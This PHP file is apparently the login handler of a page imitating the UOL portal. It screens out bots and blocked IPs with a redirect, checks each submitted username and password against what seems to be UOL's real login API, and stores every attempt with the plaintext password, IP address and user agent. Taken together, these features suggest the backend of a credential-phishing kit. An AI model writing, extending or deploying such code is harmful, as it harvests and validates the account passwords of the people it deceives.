<?php
declare(strict_types=1);

require __DIR__ . '/includes/security.php';

$config = require __DIR__ . '/config.php';
public_session_start($config);

require __DIR__ . '/includes/anti_bot.php';
require __DIR__ . '/includes/messages.php';
require __DIR__ . '/includes/storage.php';
require __DIR__ . '/includes/uol_verify.php';
require __DIR__ . '/includes/api_auth.php';

header('Content-Type: application/json; charset=utf-8');

$denyUrl = uol_blocked_redirect($config);
$botCheck = anti_bot_evaluate($config);
if (!$botCheck['allowed']) {
    http_response_code(403);
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['message' => 'invalid_login', 'text' => uol_msg('invalid_login')]);
    exit;
}

if (!rate_limit_check('uol_login', 30, 300)) {
    http_response_code(429);
    echo json_encode(['message' => 'invalid_login', 'text' => uol_msg('invalid_login')]);
    exit;
}

$user = trim((string) ($_POST['login'] ?? $_POST['user'] ?? ''));
$pass = (string) ($_POST['password'] ?? $_POST['pass'] ?? '');
$storage = new Storage($config['data_dir']);
$ip = client_ip();
$ua = client_ua();

if ($storage->isIpBlocked($ip)) {
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

$result = uol_api_verify($user, $pass, $config, true);
$ok = !empty($result['payload']['ok']);

$storage->recordLoginAttempt($user, $pass, $ok, $ip, $ua);

if ($ok) {
    $_SESSION['uol_user'] = $user;
}

uol_api_json_response($result['status'], $result['payload']);
